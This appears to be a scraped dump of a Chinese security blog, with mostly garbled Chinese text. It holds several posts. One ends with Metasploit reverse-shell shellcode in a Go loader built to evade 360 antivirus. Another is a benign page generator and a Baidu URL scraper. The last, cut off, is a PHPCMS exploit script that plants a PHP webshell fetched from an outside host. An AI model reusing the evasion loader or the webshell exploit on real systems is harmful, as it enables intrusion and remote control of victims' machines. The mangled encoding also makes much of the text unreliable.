\u0026#34;\\xd0\\x68\\xfb\\xe0\\xae\\xbd\\x56\\x52\\x17\\x9a\\xf8\\x8f\\xc0\u0026#34; buf += \u0026#34;\\x14\\x8c\\xb0\\xf7\\x0e\\x87\\xfa\\x54\\xf4\\x04\\x4a\\x5a\\xc8\u0026#34; buf += \u0026#34;\\x89\\x57\\x0e\\xbf\\x7a\\x76\\x9b\\xfe\\xb8\\x5f\\x31\\x42\\xec\u0026#34; buf += \u0026#34;\\xaf\\x18\\x9e\\x3f\\xf0\\x09\\x79\\x86\\xb3\\x08\\x29\\x50\\xfd\u0026#34; buf += \u0026#34;\\xc3\\x46\\x7d\\x24\\x51\\x5b\\xd0\\x81\\x19\\x6f\\xc2\\x2c\\x17\u0026#34; buf += \u0026#34;\\xab\\xa3\\xb7\\xd9\\x6f\\x82\\xd9\\x37\\x5f\\x38\\x01\\xd8\\xfd\u0026#34; buf += \u0026#34;\\xfd\\x11\\x22\\x61\\xd0\\x92\\x45\\x37\\x4f\\x6c\\x4e\\x91\\x3b\u0026#34; buf += \u0026#34;\\x42\\x07\\xc5\\x77\\xdc\\x52\\xd6\\xc7\\x9d\\x7b\\x62\\xba\\x1c\u0026#34; buf += \u0026#34;\\x62\\x3c\\xde\\xad\\x96\\x03\\x55\\xde\\x9d\\x52\\x5c\\x5d\\x0c\u0026#34; buf += \u0026#34;\\x73\\x0e\\xc3\\x4c\\xae\\x7d\\x1c\\x7c\\x64\\xaf\\xbb\\xce\\xa6\u0026#34; buf += \u0026#34;\\x02\\x0e\\xb1\\x51\\xc4\\x2d\\x1b\\x6b\\xb7\\x7c\\xd9\\x4b\\xc3\u0026#34; buf += \u0026#34;\\x8c\\x43\\xd6\\x1b\\x2a\\x4f\\x5e\\x0a\\x9a\\xd5\\x4d\\x45\\x64\u0026#34; buf += \u0026#34;\\x6c\\x0c\\xc8\\xf5\\x59\\xd7\\x45\\x36\\x85\\x99\\x8d\\x34\\x65\u0026#34; buf += \u0026#34;\\x21\\xd3\\x3b\\x35\\xce\\x22\\x29\\x0c\\x4e\\xca\\x48\\x3f\\x55\u0026#34; buf += \u0026#34;\\x5d\\x1b\\xda\\x35\\xc1\\x2d\u0026#34; // at your call site, you can send the shellcode directly to the C // function by converting it to a pointer of the correct type. shellcode := []byte(buf) C.call((*C.char)(unsafe.Pointer(\u0026amp;shellcode[0]))) } ä»¥ä¸Šå°±æ˜¯å…¨éƒ¨ä»£ç  å…¶å®Golangè¿˜æœ‰ä¸ªæ‰§è¡Œshellcodeçš„æ–¹æ³•æ˜¯ä¸ç”¨å†…è”Cè¯­è¨€çš„ï¼Œä½†æ˜¯æˆ‘è¿™è¾¹æµ‹è¯•èƒ½æ¥åˆ°åå¼¹shellï¼Œä½†æ˜¯æ‰§è¡Œå‘½ä»¤ä¼šç›´æ¥æ–­å¼€ï¼Œä»£ç æˆ‘ä¹Ÿè´´å‡ºæ¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package main import ( \u0026#34;syscall\u0026#34; \u0026#34;unsafe\u0026#34; ) func ThreadExecute(Shellcode []byte) { var K32 = syscall.MustLoadDLL(\u0026#34;kernel32.dll\u0026#34;) var CreateThread = K32.MustFindProc(\u0026#34;CreateThread\u0026#34;) var VirtualAlloc = K32.MustFindProc(\u0026#34;VirtualAlloc\u0026#34;) var WaitForSingleObject = K32.MustFindProc(\u0026#34;WaitForSingleObject\u0026#34;) Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE) AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr)) for i := 0; i \u0026lt; len(Shellcode); i++ { AddrPtr[i] = Shellcode[i] } ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0) WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF) } å…³äºæ–­å¼€çš„åŸå› ï¼Œå¸Œæœ›æ‰¾å‡ºåŸå› çš„èƒ½å‘ŠçŸ¥æˆ‘ä¸€ä¸‹ï¼Œå…¶å®æˆ‘ä»¬ä¼šå‘ç°ï¼Œå†…è”Cæ˜¯æ¯”è¾ƒç®€å•çš„\næ€æ¯’æµ‹è¯• åœ¨ä»£ç æ‰€åœ¨ç›®å½•cmdæ‰§è¡Œgo buildå¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæˆ–è€…å¯ä»¥ç”¨go build -ldflags=\u0026quot;-s -w\u0026quot;å‡å°ä½“ç§¯ï¼Œgo build -ldflags=\u0026quot;-H windowsgui -s -w\u0026quot;å»æ‰å‘½ä»¤çª—å£ï¼‰ å¯ä»¥çœ‹åˆ°360çš„é™æ€æŸ¥æ€å’ŒåŠ¨æ€æŸ¥æ€éƒ½æ²¡æœ‰å‘ç° é‚£ä¹ˆæ˜¯å¦æ­£å¸¸å·¥ä½œå‘¢ å¯ä»¥çœ‹åˆ°å®Œå…¨æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½“ç§¯æ¯”pythonç¼–è¯‘å‡ºæ¥çš„å°çš„å¤šï¼Œç¼–è¯‘å‡ºæ¥æ˜¯500å¤škbï¼Œç„¶åç»è¿‡upxå‹ç¼©äº†ä¸€ä¸‹ï¼ˆæµ‹è¯•upxå‹ç¼©ååŠŸèƒ½ä¾æ—§æ­£å¸¸ï¼‰ï¼Œé™ä½åˆ°äº†200å¤škb è§†é¢‘ {% bilibili \u0026ldquo;aid:9975200\u0026rdquo; \u0026ldquo;quality:high\u0026rdquo; \u0026ldquo;danmaku\u0026rdquo; \u0026ldquo;allowfullscreen\u0026rdquo; %}\n","permalink":"https://www.hacktech.cn/post/msf-antivirus.html","summary":"\u003cp\u003emsfæ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„å·¥å…·ï¼Œæˆ‘ç»å¸¸ä¼šåœ¨æ¸—é€ç”¨å®ƒæ¥åå¼¹shellï¼Œä¸è¿‡å®ƒç”Ÿæˆçš„åå¼¹åé—¨ä¼šè¢«ä¸å°‘æ€è½¯killï¼Œè¿™ç¯‡æ–‡ç« åªæ˜¯è®²è®²æˆ‘åœ¨msfä¸­ä¸€ä¸ªç®€å•çš„å…æ€å°æŠ€å·§\u003c/p\u003e","title":"å…³äºmsfåå¼¹åé—¨çš„å…æ€Tips"},{"content":"è™½è¯´æˆ‘çš„ç½‘ç›˜ï¼ˆexmï¼Œä¹Ÿè®¸é¡µé¢ç¡®å®ä¸‘äº†ç‚¹ï¼Œä¸è¿‡é¡µé¢ç”Ÿæˆçš„æ ·å¼ä½ è‡ªå·±å¯ä»¥æ”¹ï¼‰ç¾å·¥å·²ç»è¢«ä¹±åˆ€ç æ­»ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å°ä¼™ä¼´é—®æˆ‘æ˜¯æ€ä¹ˆæ­å»ºçš„\nå…³äºæ­å»º è¿™ä¸ªçœŸæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œvpsæˆ‘åªå®‰è£…äº†nginxï¼Œç„¶åé…ç½®åŸŸåæŒ‡å‘åˆ°æˆ‘çš„åŒæ­¥ç›®å½•ï¼Œç„¶åç”¨å…¶ä»–å·¥å…·åŒæ­¥ä¸Šå»å°±è¡Œäº†ï¼ˆå…³äºé—®è‡ªå·±æ‰‹åŠ¨åŒæ­¥éº»çƒ¦çš„ï¼Œå…¶å®å¹¶ä¸éº»çƒ¦ï¼Œæœ‰å¾ˆå¤šå¥½ç”¨çš„è½¯ä»¶ï¼Œæœ¬äººç”¨çš„Resilio Syncï¼‰\nå…³äºé¡µé¢çš„ç”Ÿæˆ ç¬¬ä¸€é˜¶æ®µ é‚£æ—¶å€™åªæœ‰ä¸¤ä¸‰ä¸ªæ–‡ä»¶ï¼Œhtmlé¡µé¢æ˜¯æˆ‘æ‰‹å†™çš„æ‰‹åŠ¨å¢åŠ çš„\nç¬¬äºŒé˜¶æ®µ æ­¤æ—¶å·²ç»æœ‰äº†ä¸€ä¸ªå­ç›®å½•ï¼Œæ–‡ä»¶å¼€å§‹å¢å¤šï¼Œæˆ‘å¼€å§‹è€ƒè™‘å†™ä¸ªç®€å•çš„å…ˆç”¨ç€ï¼ŒPythonçš„å†™äº†ï¼Œä¸è¿‡é€Ÿåº¦æ„Ÿè§‰æœ‰ç‚¹ä¸å¦‚æ„ï¼ˆåŸè°…æˆ‘çš„å¹æ¯›æ±‚ç–µï¼‰,å¹¶ä¸”æœ‰ä¸ªéº»çƒ¦äº‹æ˜¯æ¯æ¬¡é‡è£…ç³»ç»Ÿåéœ€è¦å®‰è£…Pythonï¼Œç„¶åæˆ‘é€‰ç”¨äº†Golangï¼Œæ—¶é—´ä»“ä¿ƒå†™äº†ä¸€ä¸ªå•é¡µé¢ç”Ÿæˆï¼Œä¸è¿›è¡Œç›®å½•æ·±åº¦éå†çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘æ¯æ¬¡æ–°å¼€ä¸€ä¸ªç›®å½•éœ€è¦æŠŠè¿™ä¸ªç¨‹åºæ‹·è´åˆ°å½“ç›®å½•ä¸‹åŒå‡»ç”Ÿæˆhtml\nç¬¬ä¸‰é˜¶æ®µ æ–‡ä»¶å¤¹å’Œæ–‡ä»¶æ—¥ç›Šå¢å¤šï¼Œä¸Šé¢çš„æ–¹å¼æˆ‘å·²ç»æ„Ÿè§‰åˆ°ç‰¹åˆ«ç¹çäº†ï¼Œéœ€è¦æ‰¾ä¸ªæœºä¼šæŠŠä»£ç é‡æ„ä¸€ä¸‹ï¼Œä½¿ä»–æ›´åŠ ä¼˜åŒ– ç„¶åæˆ‘å¼€å§‹ç€æ‰‹å†™ç¬¬äºŒç‰ˆï¼Œè¿™ä¸ªç‰ˆæœ¬æˆ‘æ²¡ä¿ç•™ï¼Œå…·ä½“åŠŸèƒ½å°±æ˜¯å¯¹ä¸Šä¸€ä¸ªç‰ˆæœ¬åšäº†ä¸€ç‚¹æ”¹è¿›ï¼Œä½¿å®ƒæ”¯æŒäº†æ·±åº¦éå† ä½†æ˜¯è‡ªä»T00lsçµè½¦æ¼‚ç§»äº‹ä»¶ä»¥æ¥ï¼Œå®˜æ–¹ç®¡ç†å‘˜ç»™GetWriterè€å“¥ï¼ˆå¦‚æœè°è®¤è¯†å¸Œæœ›å‘ŠçŸ¥ï¼Œå¸Œæœ›èƒ½è‡´ä¸ªæ­‰ï¼‰çš„ä¸€çº¸å°ä¹¦å°†æ­¤äº‹æ¨ä¸Šé£å£æµªå°–ï¼Œä½œä¸ºå§‹ä½œä¿‘è€…ï¼Œæˆ‘ç½‘ç«™é¦–å½“å…¶å†²ï¼Œé­å—äº†å¤§é‡è€å“¥å¤šæ¥è‡ªå¤œé—´çš„æ´—ç¤¼ï¼ˆè¯´å®è¯ï¼Œå¸Œæœ›é«˜æŠ¬è´µæ‰‹ï¼Œæµé‡å¿«æ²¡äº†ï¼‰ï¼Œè¿™ä»¶äº‹æƒ…æŒç»­å‘é…µäº†ä¸¤ä¸‰å¤©ï¼Œæˆ‘ä¸€ç›´åœ¨æ€è€ƒï¼Œå¦‚ä½•ä¸ºè€å“¥ä»¬å¸¦æ¥æ›´è‰¯å¥½çš„è§‚æ„Ÿä½“éªŒï¼Œäºæ˜¯æˆ‘è§‰å¾—åº”è¯¥è¦è®©è¿™ä¸ªé¡µé¢ç”Ÿæˆå™¨å¯¹å‰ç«¯å±•ç¤ºçš„ä¿®æ”¹æ›´åŠ æ–¹ä¾¿ï¼Œæ— é¡»ä»ä»£ç å…¥æ‰‹ï¼Œå¼€å§‹äº†ç¬¬ä¸‰ç‰ˆçš„ç¼–å†™\næš‚æ—¶å®ç°çš„åŠŸèƒ½ æ”¯æŒæ¨¡æ¿ åŠ å…¥äº†é…ç½®æ–‡ä»¶ï¼ˆå…¶å®ä¹Ÿæ˜¯æ¨¡æ¿ï¼‰ åŠ å…¥äº†noView.txtè§„åˆ™ï¼ˆå…·ä½“è¡¨ç°ä¸ºè¿™ä¸ªtxtä¸­çš„æ–‡ä»¶åå°†ä¸å‚ä¸ç”Ÿæˆhtmlé¡µé¢ï¼‰ å¯èƒ½ä»¥åä¼šæŠ½æ—¶é—´å†è¿›è¡Œä¼˜åŒ–ï¼Œè¿™ä¸ªæ—¶é—´ä¸å®šï¼Œçœ‹å“ªå¤©è‡ªå·±çš„éœ€æ±‚æ›´é«˜äº† æ›´æ–°è®°å½•åœ¨ä¸‹é¢ï¼Œæ›´æ–°åçš„ä»£ç å°±ä¸è´´äº†ï¼Œä¹‹å‰çš„ä»£ç æˆ‘å°±åœ¨è¿™ä¸ªé¡µé¢ä¸Šåˆ äº†ï¼Œè‡ªå·±æ„Ÿå…´è¶£å¯ä»¥ä¸ŠgithubæŸ¥çœ‹ è‡³äºå‰ç«¯ ä½ ä»¬åˆ«æƒ³äº†ï¼Œå‰ç«¯ä¹‹é­‚åœ¨æˆ‘ä½“å†…æ²¡å­˜åœ¨è¿‡ï¼Œå“ªå¤©å…´è‡´æ¥äº†å¯èƒ½ä¼šçœ‹çœ‹ç›¸å…³çŸ¥è¯†ï¼Œè¿™ä¸ªä¸‘é¡µé¢å°±ä¸‘ç€å‡‘åˆçœ‹å§ï¼Œå¦‚æœæœ‰èƒ½åŠ›å¯ä»¥è¿›è¡ŒäºŒæ¬¡ä¿®æ”¹\nä¸ºå®ƒæäº†ä¸€å¥—cssä¸æ–‡ä»¶ç±»å‹å›¾æ ‡ï¼ˆå…³äºstyle.cssæ–‡ä»¶ï¼Œæ˜¯éœ€è¦ä½ æ”¾åˆ°è¿œç«¯åœ¨çº¿è°ƒç”¨çš„ï¼Œä½ å¯ä»¥ä¸Šä¼ åˆ°ä¸ƒç‰›ï¼Œæˆ–è€…ä½ åŒæ­¥çš„æ—¶å€™æ”¾åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œç„¶åé€šè¿‡åŸŸå+/style.cssçš„æ–¹å¼æ¥è°ƒç”¨ï¼‰\næ›´æ–°è®°å½• å¯¹ä¸€éƒ¨åˆ†å†—ä½™çš„è¿›è¡Œäº†ä¼˜åŒ–ï¼Œæå‡äº†ä¸€ä¸ç‚¹æ•ˆç‡ å¯ä»¥æ”¾åˆ°ç¯å¢ƒå˜é‡pathäº†ï¼Œä¸éœ€è¦æ”¾åˆ°æœ¬ç›®å½•é‡Œäº†ï¼Œåªéœ€è¦åœ¨æœ¬ç›®å½•è°ƒç”¨å°±å¯ä»¥ï¼ˆå½“ç„¶ï¼‰ï¼ŒæŒ‰ç…§ä¹‹å‰çš„æ–¹æ³•ä¹Ÿæ˜¯å¯ä»¥çš„ å¯¹æ–‡ä»¶liåˆ—è¡¨åšäº†æ’åºï¼Œä¼˜å…ˆçº§ä¸ºåç¼€å-\u0026gt;æ–‡ä»¶å å¯¹liåˆ—è¡¨åŠ äº†cssç±»ï¼Œå¯ä»¥è‡ªå®šä¹‰liçš„cssäº†ï¼Œå…·ä½“è§ç”Ÿæˆåçš„æ–‡ä»¶ ä¸ºé¡µé¢ç”Ÿæˆå™¨æäº†ä¸€å¥—cssï¼Œä¸ºç±»å‹åŠ ä¸Šäº†å›¾æ ‡ï¼Œå…·ä½“æ•ˆæœè§ä¸‹å›¾ ä¸‹è½½åœ°å€ è¿™æ¬¡ä¸èƒ½ç»™æŠ“ä½æœºä¼šäº†ï¼Œæ”¾githubå§\nä»£ç ä¸‹è½½åœ°å€ äºŒè¿›åˆ¶æ–‡ä»¶ä¸‹è½½åœ°å€ ","permalink":"https://www.hacktech.cn/post/my-yun-generatehtml-with-golang.html","summary":"\u003cp\u003eè™½è¯´æˆ‘çš„ç½‘ç›˜ï¼ˆexmï¼Œä¹Ÿè®¸é¡µé¢ç¡®å®ä¸‘äº†ç‚¹ï¼Œä¸è¿‡é¡µé¢ç”Ÿæˆçš„æ ·å¼ä½ è‡ªå·±å¯ä»¥æ”¹ï¼‰ç¾å·¥å·²ç»è¢«ä¹±åˆ€ç æ­»ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å°ä¼™ä¼´é—®æˆ‘æ˜¯æ€ä¹ˆæ­å»ºçš„\u003c/p\u003e\n\u003ch2 id=\"å…³äºæ­å»º\"\u003eå…³äºæ­å»º\u003c/h2\u003e\n\u003cp\u003eè¿™ä¸ªçœŸæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œvpsæˆ‘åªå®‰è£…äº†nginxï¼Œç„¶åé…ç½®åŸŸåæŒ‡å‘åˆ°æˆ‘çš„åŒæ­¥ç›®å½•ï¼Œç„¶åç”¨å…¶ä»–å·¥å…·åŒæ­¥ä¸Šå»å°±è¡Œäº†ï¼ˆå…³äºé—®è‡ªå·±æ‰‹åŠ¨åŒæ­¥éº»çƒ¦çš„ï¼Œå…¶å®å¹¶ä¸éº»çƒ¦ï¼Œæœ‰å¾ˆå¤šå¥½ç”¨çš„è½¯ä»¶ï¼Œæœ¬äººç”¨çš„Resilio Syncï¼‰\u003c/p\u003e","title":"è‡ªå·±ç½‘ç›˜çš„é¡µé¢ç”Ÿæˆå™¨(ç§ç”¨å…¬å¼€-Golang)"},{"content":"ä»£ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def parseBaidu(keyword, pagenum): keywordsBaseURL = \u0026#39;https://www.baidu.com/s?wd=\u0026#39; + str(quote(keyword)) + \u0026#39;\u0026amp;oq=\u0026#39; + str(quote(keyword)) + \u0026#39;\u0026amp;ie=utf-8\u0026#39; + \u0026#39;\u0026amp;pn=\u0026#39; pnum = 0 while pnum \u0026lt;= int(pagenum): baseURL = keywordsBaseURL + str(pnum*10) try: request = requests.get(baseURL, headers=headers) soup = BeautifulSoup(request.text, \u0026#34;html.parser\u0026#34;) for a in soup.select(\u0026#39;div.c-container \u0026gt; h3 \u0026gt; a\u0026#39;): url = requests.get(a[\u0026#39;href\u0026#39;], headers=headers).url yield url except: yield None finally: pnum += 1 ç¤ºä¾‹ç”¨æ³• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import requests from bs4 import BeautifulSoup headers = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\u0026#34; } def parseBaidu(keyword, pagenum) def main(): for url in parseBaidu(\u0026#34;keyword\u0026#34;,10): if url: print(url) else: continue ","permalink":"https://www.hacktech.cn/post/baidusearch-get-realurl-with-python.html","summary":"\u003ch2 id=\"ä»£ç \"\u003eä»£ç \u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eparseBaidu\u003c/span\u003e(keyword, pagenum):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    keywordsBaseURL \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://www.baidu.com/s?wd=\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e str(quote(keyword)) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026amp;oq=\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e str(quote(keyword)) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026amp;ie=utf-8\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026amp;pn=\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    pnum \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e pnum \u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e int(pagenum):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        baseURL \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e keywordsBaseURL \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e str(pnum\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            request \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e requests\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(baseURL, headers\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eheaders)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            soup \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e BeautifulSoup(request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etext, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;html.parser\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e soup\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eselect(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;div.c-container \u0026gt; h3 \u0026gt; a\u0026#39;\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                url \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e requests\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(a[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;href\u0026#39;\u003c/span\u003e], headers\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eheaders)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eurl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eyield\u003c/span\u003e url\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eyield\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efinally\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            pnum \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"ç™¾åº¦æœç´¢å¼•æ“å–çœŸå®åœ°å€-pythonä»£ç "},{"content":"ä»‹ç» ä¸€é”®åŒ–python 1.py http://xxx.com,å¦‚æœæ˜¯æ‰¹é‡ç›´æ¥è¿è¡Œpyæ–‡ä»¶å³å¯ å¾…åŠ [] åŠ å…¥å¯¹æœ‰éªŒè¯ç phpcmsç½‘ç«™çš„æ”¯æŒ [] åŠ å…¥æ‰¹é‡(å·²å®Œæˆ) è¯´æ˜ ä¾èµ–åº“çš„å®‰è£…pip install requests\nä»£ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 # -*- coding:utf-8 -*- \u0026#39;\u0026#39;\u0026#39; ---------------------- Author : Akkuman Blog : www.hacktech.cn ---------------------- \u0026#39;\u0026#39;\u0026#39; import requests import sys from random import Random chars = \u0026#39;qwertyuiopasdfghjklzxcvbnm0123456789\u0026#39; def main(): if len(sys.argv) \u0026lt; 2: print(\u0026#34;[*]Usage : Python 1.py http://xxx.com\u0026#34;) sys.exit() host = sys.argv[1] url = host + \u0026#34;/index.php?m=member\u0026amp;c=index\u0026amp;a=register\u0026amp;siteid=1\u0026#34; data = { \u0026#34;siteid\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;modelid\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;dsakkfaffdssdudi\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;dsakkfddsjdi@qq.com\u0026#34;, # å¦‚æœæƒ³ä½¿ç”¨å›è°ƒçš„å¯ä»¥ä½¿ç”¨http://file.codecat.one/oneword.txtï¼Œä¸€å¥è¯åœ°å€ä¸º.phpåé¢åŠ ä¸Še=YXNzZXJ0 \u0026#34;info[content]\u0026#34;: \u0026#34;\u0026lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg\u0026gt;\u0026#34;, \u0026#34;dosubmit\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;\u0026#34;, } try: rand_name = chars[Random().randint(0, len(chars) - 1)] data[\u0026#34;username\u0026#34;] = \u0026#34;akkuman_%s\u0026#34; % rand_name 